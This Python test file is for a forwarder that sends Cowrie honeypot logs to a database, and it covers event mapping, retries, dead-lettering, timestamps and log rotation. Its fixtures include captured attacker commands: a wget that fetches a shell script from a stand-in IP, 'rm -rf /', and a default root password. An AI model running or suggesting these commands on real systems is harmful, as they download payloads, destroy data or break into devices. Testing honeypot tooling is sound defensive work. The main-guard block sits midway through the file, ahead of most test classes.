#!/usr/bin/env python3
"""Tests for the forwarder.

Two halves.

map_event is the contract between the sensor and the database: whatever it
drops is gone permanently, because Cowrie's log rotates and there is no second
copy. It had no tests until three event types turned out to have been silently
discarded for the life of the project.

The rest is the delivery machinery — offsets, retries, dead-lettering, log
rotation. That is what makes delivery at-least-once, and it had no tests at
all, which is how post_batch came to treat a 500 as retryable forever and
stalled ingestion for twelve hours on 2026-09-06.

Stdlib only, matching the forwarder itself.
"""
import io
import json
import os
import tempfile
import unittest
import urllib.error
from unittest import mock

# forwarder.py reads its config at import time.
os.environ.setdefault("FWD_BASE_URL", "https://example.invalid")
os.environ.setdefault("FWD_TOKEN", "test-token")

import forwarder  # noqa: E402


class TestMapEvent(unittest.TestCase):
    def test_login_failed_carries_the_credentials(self):
        kind, row = forwarder.map_event({
            "eventid": "cowrie.login.failed", "timestamp": "2026-08-16T10:00:00.000Z",
            "src_ip": "1.2.3.4", "session": "s1", "username": "root", "password": "xc3511",
        })
        self.assertEqual(kind, "event")
        self.assertEqual((row["username"], row["password"]), ("root", "xc3511"))
        self.assertNotIn("kind", row)

    def test_command_input_is_mapped_from_input_not_command(self):
        kind, row = forwarder.map_event({
            "eventid": "cowrie.command.input", "timestamp": "2026-08-16T10:00:00.000Z",
            "src_ip": "1.2.3.4", "session": "s1", "input": "wget http://1.2.3.4/bins.sh",
        })
        self.assertEqual(kind, "event")
        self.assertEqual(row["command"], "wget http://1.2.3.4/bins.sh")

    def test_file_download_uses_shasum(self):
        kind, row = forwarder.map_event({
            "eventid": "cowrie.session.file_download", "timestamp": "2026-08-16T10:00:00.000Z",
            "shasum": "a" * 64, "size": 4096, "destfile": "/tmp/bins.sh",
        })
        self.assertEqual(kind, "file")
        self.assertEqual(row["sha256"], "a" * 64)

    # --- the three that were being discarded --------------------------------

    def test_client_version_is_captured(self):
        kind, row = forwarder.map_event({
            "eventid": "cowrie.client.version", "timestamp": "2026-08-16T10:00:00.000Z",
            "src_ip": "1.2.3.4", "session": "s1", "version": "SSH-2.0-libssh2_1.9.0",
        })
        self.assertEqual(kind, "event")
        self.assertEqual(row["kind"], "client")
        self.assertEqual(row["client_version"], "SSH-2.0-libssh2_1.9.0")
        self.assertEqual(row["session_id"], "s1")

    def test_client_kex_captures_the_hassh(self):
        kind, row = forwarder.map_event({
            "eventid": "cowrie.client.kex", "timestamp": "2026-08-16T10:00:00.000Z",
            "src_ip": "1.2.3.4", "session": "s1",
            "hassh": "06046964c022c6407d15a27b12a6a4fb",
            "kexAlgs": ["curve25519-sha256"],
        })
        self.assertEqual(row["kind"], "client")
        self.assertEqual(row["hassh"], "06046964c022c6407d15a27b12a6a4fb")

    def test_version_and_kex_share_a_session_so_they_can_be_merged(self):
        _, a = forwarder.map_event({
            "eventid": "cowrie.client.version", "session": "s1", "src_ip": "1.2.3.4",
            "timestamp": "2026-08-16T10:00:00.000Z", "version": "SSH-2.0-Go"})
        _, b = forwarder.map_event({
            "eventid": "cowrie.client.kex", "session": "s1", "src_ip": "1.2.3.4",
            "timestamp": "2026-08-16T10:00:01.000Z", "hassh": "deadbeef"})
        self.assertEqual(a["session_id"], b["session_id"])
        self.assertEqual(a["kind"], b["kind"])

    def test_direct_tcpip_request_becomes_a_tunnel(self):
        kind, row = forwarder.map_event({
            "eventid": "cowrie.direct-tcpip.request", "timestamp": "2026-08-16T10:00:00.000Z",
            "src_ip": "1.2.3.4", "session": "s1", "dst_ip": "smtp.example.com", "dst_port": 25,
        })
        self.assertEqual(kind, "event")
        self.assertEqual(row["kind"], "tunnel")
        self.assertEqual((row["dst_host"], row["dst_port"]), ("smtp.example.com", 25))

    def test_direct_tcpip_data_is_ignored(self):
        # One event per relayed chunk. Forwarding these would flood the batcher
        # for no analytic gain; the request already records the destination.
        self.assertEqual(
            forwarder.map_event({"eventid": "cowrie.direct-tcpip.data", "session": "s1",
                                 "timestamp": "2026-08-16T10:00:00.000Z", "data": "x" * 500}),
            (None, None))

    def test_tunnel_without_a_destination_is_dropped(self):
        self.assertEqual(
            forwarder.map_event({"eventid": "cowrie.direct-tcpip.request", "session": "s1",
                                 "timestamp": "2026-08-16T10:00:00.000Z"}),
            (None, None))

    # --- robustness ---------------------------------------------------------

    def test_a_line_with_no_eventid_does_not_raise(self):
        # map_event is called from the tail loop without a try, so an
        # AttributeError here would kill ingestion until someone noticed.
        self.assertEqual(forwarder.map_event({"timestamp": "2026-08-16T10:00:00.000Z"}),
                         (None, None))
        self.assertEqual(forwarder.map_event({"eventid": None}), (None, None))

    def test_an_unhandled_event_type_is_ignored(self):
        self.assertEqual(
            forwarder.map_event({"eventid": "cowrie.log.closed", "session": "s1"}),
            (None, None))

    def test_new_kinds_are_tagged_and_old_ones_are_not(self):
        # The backend routes on `kind`; an untagged row goes to cowrie_events.
        # If a plain event ever gained a `kind`, it would silently stop being
        # counted in the event total the whole dashboard is built on.
        for eid in ("cowrie.login.failed", "cowrie.command.input", "cowrie.session.connect"):
            _, row = forwarder.map_event({
                "eventid": eid, "timestamp": "2026-08-16T10:00:00.000Z",
                "src_ip": "1.2.3.4", "session": "s1", "input": "x"})
            self.assertNotIn("kind", row, f"{eid} must stay an untagged event")


if __name__ == "__main__":
    unittest.main()


def http_error(code, body=b"nope"):
    """An HTTPError shaped the way urllib raises them, with a readable body."""
    return urllib.error.HTTPError("https://example.invalid", code, "err", {}, io.BytesIO(body))


class FakeResponse:
    """urlopen's context-manager response, with just the attribute we read."""

    def __init__(self, status):
        self.status = status

    def __enter__(self):
        return self

    def __exit__(self, *exc):
        return False


class StateFileTests(unittest.TestCase):
    """The offset is the only thing standing between a restart and either
    replaying the whole log or skipping past unread events."""

    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)
        patcher = mock.patch.object(forwarder, "STATE_PATH", os.path.join(self.tmp.name, "state.json"))
        patcher.start()
        self.addCleanup(patcher.stop)

    def test_missing_state_starts_from_the_beginning(self):
        self.assertEqual(forwarder.load_state(), {"inode": None, "offset": 0})

    def test_corrupt_state_starts_over_rather_than_crashing(self):
        # A truncated write (power cut mid-save) must not wedge the service in
        # a crash loop. Starting over re-sends events, which is fine: delivery
        # is at-least-once by design.
        with open(forwarder.STATE_PATH, "w") as f:
            f.write("{not json")
        self.assertEqual(forwarder.load_state(), {"inode": None, "offset": 0})

    def test_state_round_trips(self):
        forwarder.save_state({"inode": 42, "offset": 1234})
        self.assertEqual(forwarder.load_state(), {"inode": 42, "offset": 1234})

    def test_save_is_atomic_and_leaves_no_temp_file(self):
        # Written to .tmp then os.replace'd, so a reader never sees a partial
        # file and a crash mid-write cannot corrupt the real one.
        forwarder.save_state({"inode": 1, "offset": 1})
        self.assertEqual(os.listdir(os.path.dirname(forwarder.STATE_PATH)), ["state.json"])

    def test_save_creates_the_state_directory(self):
        nested = os.path.join(self.tmp.name, "does", "not", "exist", "state.json")
        with mock.patch.object(forwarder, "STATE_PATH", nested):
            forwarder.save_state({"inode": 7, "offset": 7})
            self.assertTrue(os.path.exists(nested))


class PostBatchTests(unittest.TestCase):
    """Which HTTP statuses are permanent and which are worth retrying. Getting
    this wrong is not a subtle bug: park too much and honeypot data is thrown
    away, park too little and one poison batch stalls the pipeline forever."""

    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)
        for name, value in (("STATE_PATH", os.path.join(self.tmp.name, "state.json")),):
            p = mock.patch.object(forwarder, name, value); p.start(); self.addCleanup(p.stop)
        # Backoff sleeps real seconds otherwise.
        p = mock.patch.object(forwarder.time, "sleep"); p.start(); self.addCleanup(p.stop)

    def deadletter_lines(self):
        path = os.path.join(self.tmp.name, "deadletter.jsonl")
        if not os.path.exists(path):
            return []
        with open(path) as f:
            return [json.loads(line) for line in f if line.strip()]

    def test_empty_batch_makes_no_request(self):
        with mock.patch.object(forwarder.urllib.request, "urlopen") as urlopen:
            forwarder.post_batch("https://x/events", "events", [])
        urlopen.assert_not_called()

    def test_success_returns_without_parking_anything(self):
        with mock.patch.object(forwarder.urllib.request, "urlopen", return_value=FakeResponse(200)):
            forwarder.post_batch("https://x/events", "events", [{"a": 1}])
        self.assertEqual(self.deadletter_lines(), [])

    def test_payload_rejections_are_parked_not_retried(self):
        # 400, 413 and 422 mean the backend will never accept this body. Retry
        # cannot help, so park it and move on.
        for code in (400, 413, 422):
            with self.subTest(code=code):
                with mock.patch.object(forwarder.urllib.request, "urlopen", side_effect=http_error(code)) as urlopen:
                    forwarder.post_batch("https://x/events", "events", [{"a": code}])
                self.assertEqual(urlopen.call_count, 1, "a permanent rejection must not be retried")
        parked = self.deadletter_lines()
        self.assertEqual([p["status"] for p in parked], [400, 413, 422])
        self.assertEqual(parked[0]["rows"], [{"a": 400}])

    def test_a_500_is_retried_and_never_parked(self):
        # The twelve-hour outage on 2026-09-06 was the other side of this: a
        # 500 retried the same poisoned batch every 60s forever. The retry is
        # correct — a 500 is the server's problem and may clear — so the fix
        # belonged in the backend, and this test pins the client behaviour so
        # nobody "fixes" it by discarding data instead.
        with mock.patch.object(forwarder.urllib.request, "urlopen",
                               side_effect=[http_error(500), FakeResponse(200)]) as urlopen:
            forwarder.post_batch("https://x/events", "events", [{"a": 1}])
        self.assertEqual(urlopen.call_count, 2)
        self.assertEqual(self.deadletter_lines(), [], "a 500 must never be dead-lettered")

    def test_auth_and_rate_limit_failures_are_retried_not_discarded(self):
        # A rotated or mistyped token is operator-fixable. Silently binning
        # captured attacks because of a config typo would be worse than
        # stalling visibly.
        for code in (401, 403, 408, 429):
            with self.subTest(code=code):
                with mock.patch.object(forwarder.urllib.request, "urlopen",
                                       side_effect=[http_error(code), FakeResponse(200)]) as urlopen:
                    forwarder.post_batch("https://x/events", "events", [{"a": 1}])
                self.assertEqual(urlopen.call_count, 2)
        self.assertEqual(self.deadletter_lines(), [])

    def test_network_errors_are_retried(self):
        with mock.patch.object(forwarder.urllib.request, "urlopen",
                               side_effect=[urllib.error.URLError("down"), FakeResponse(200)]) as urlopen:
            forwarder.post_batch("https://x/events", "events", [{"a": 1}])
        self.assertEqual(urlopen.call_count, 2)

    def test_request_carries_the_token_and_an_honest_user_agent(self):
        # Cloudflare's Browser Integrity Check 403s "Python-urllib/x.y" and
        # silently cut ingestion off on 2026-08-11. The header is load-bearing.
        captured = []
        with mock.patch.object(forwarder.urllib.request, "urlopen",
                               side_effect=lambda req, **kw: captured.append(req) or FakeResponse(200)):
            forwarder.post_batch("https://x/events", "events", [{"a": 1}])
        req = captured[0]
        self.assertEqual(req.get_header("Authorization"), f"Bearer {forwarder.TOKEN}")
        self.assertEqual(req.get_header("User-agent"), "cowrie-forwarder/1.0")
        self.assertNotIn("python-urllib", req.get_header("User-agent").lower())
        self.assertEqual(json.loads(req.data), {"events": [{"a": 1}]})


class DeadLetterTests(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)
        p = mock.patch.object(forwarder, "STATE_PATH", os.path.join(self.tmp.name, "state.json"))
        p.start(); self.addCleanup(p.stop)

    def test_parked_batches_append_rather_than_overwrite(self):
        forwarder.dead_letter("events", [{"a": 1}], 400)
        forwarder.dead_letter("files", [{"b": 2}], 413)
        with open(os.path.join(self.tmp.name, "deadletter.jsonl")) as f:
            lines = [json.loads(l) for l in f]
        self.assertEqual([l["key"] for l in lines], ["events", "files"])
        self.assertEqual(lines[1]["rows"], [{"b": 2}])

    def test_an_unwritable_dead_letter_file_does_not_kill_the_forwarder(self):
        # Losing one batch is bad. Crashing the service and losing every
        # subsequent batch is worse.
        with mock.patch.object(forwarder, "STATE_PATH", "/proc/nonexistent/state.json"):
            forwarder.dead_letter("events", [{"a": 1}], 400)  # must not raise


class TimestampTests(unittest.TestCase):
    """Cowrie labels local wall-clock times with 'Z'. Correcting that twice is
    as wrong as not correcting it at all."""

    def test_passthrough_when_correction_is_off(self):
        with mock.patch.object(forwarder, "COWRIE_TZ", "utc"):
            self.assertEqual(forwarder.normalize_ts("2026-07-01T12:00:00.000Z"),
                             "2026-07-01T12:00:00.000Z")

    def test_unrecognised_shapes_pass_through_unmangled(self):
        with mock.patch.object(forwarder, "COWRIE_TZ", "local"):
            for odd in ("", None, "not-a-timestamp", "2026-13-45T99:99:99Z"):
                self.assertEqual(forwarder.normalize_ts(odd), odd)

    def test_both_cowrie_timestamp_formats_parse(self):
        self.assertIsNotNone(forwarder._parse_naive("2026-07-01T12:00:00.123456Z"))
        self.assertIsNotNone(forwarder._parse_naive("2026-07-01T12:00:00"))
        self.assertIsNone(forwarder._parse_naive("01/07/2026"))

    def test_local_correction_produces_a_z_suffixed_utc_string(self):
        with mock.patch.object(forwarder, "COWRIE_TZ", "local"):
            out = forwarder.normalize_ts("2026-07-01T12:00:00.000Z")
        self.assertTrue(out.endswith("Z"), out)
        self.assertIsNotNone(forwarder._parse_naive(out))


class RotationTests(unittest.TestCase):
    """Cowrie renames cowrie.json to cowrie.json.DATE, keeping the inode. The
    unread tail of the old file is lost unless it is followed by inode."""

    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)
        self.log = os.path.join(self.tmp.name, "cowrie.json")
        p = mock.patch.object(forwarder, "LOG_PATH", self.log); p.start(); self.addCleanup(p.stop)

    def test_finds_the_rotated_file_by_inode(self):
        rotated = self.log + ".2026-09-01"
        with open(rotated, "w") as f:
            f.write("{}\n")
        inode = os.stat(rotated).st_ino
        self.assertEqual(forwarder.find_rotated(inode), rotated)

    def test_returns_none_when_no_file_matches(self):
        self.assertIsNone(forwarder.find_rotated(999999999))

    def test_the_live_log_is_never_offered_as_its_own_rotation(self):
        with open(self.log, "w") as f:
            f.write("{}\n")
        self.assertIsNone(forwarder.find_rotated(os.stat(self.log).st_ino))

    def test_drain_forwards_only_what_is_past_the_offset(self):
        rotated = self.log + ".2026-09-01"
        first = json.dumps({"eventid": "cowrie.command.input", "input": "whoami", "session": "s1"}) + "\n"
        second = json.dumps({"eventid": "cowrie.command.input", "input": "uname -a", "session": "s1"}) + "\n"
        with open(rotated, "w") as f:
            f.write(first + second)
        with mock.patch.object(forwarder, "flush") as flush:
            forwarder.drain_rotated(rotated, len(first))
        events = flush.call_args[0][0]
        self.assertEqual([e["command"] for e in events], ["uname -a"])

    def test_a_final_line_without_a_newline_is_left_for_the_next_pass(self):
        # Cowrie may be mid-write. A line is only complete once its newline
        # lands, so an unterminated final line is skipped even when it happens
        # to parse — otherwise the reader consumes a prefix of a record and the
        # rest of it is never seen again.
        #
        # The line below is deliberately valid JSON. An earlier version of this
        # test used a truncated fragment, which `except ValueError` would have
        # skipped anyway, so it passed with the newline check deleted.
        rotated = self.log + ".2026-09-01"
        good = json.dumps({"eventid": "cowrie.command.input", "input": "id", "session": "s1"}) + "\n"
        unterminated = json.dumps({"eventid": "cowrie.command.input", "input": "rm -rf /", "session": "s1"})
        with open(rotated, "w") as f:
            f.write(good + unterminated)
        with mock.patch.object(forwarder, "flush") as flush:
            forwarder.drain_rotated(rotated, 0)
        self.assertEqual([e["command"] for e in flush.call_args[0][0]], ["id"])

    def test_malformed_json_is_skipped_not_fatal(self):
        rotated = self.log + ".2026-09-01"
        good = json.dumps({"eventid": "cowrie.command.input", "input": "id", "session": "s1"}) + "\n"
        with open(rotated, "w") as f:
            f.write("this is not json\n" + good)
        with mock.patch.object(forwarder, "flush") as flush:
            forwarder.drain_rotated(rotated, 0)
        self.assertEqual([e["command"] for e in flush.call_args[0][0]], ["id"])

    def test_an_unreadable_rotated_file_is_reported_not_raised(self):
        with mock.patch.object(forwarder, "flush") as flush:
            forwarder.drain_rotated(os.path.join(self.tmp.name, "gone.json"), 0)
        flush.assert_not_called()
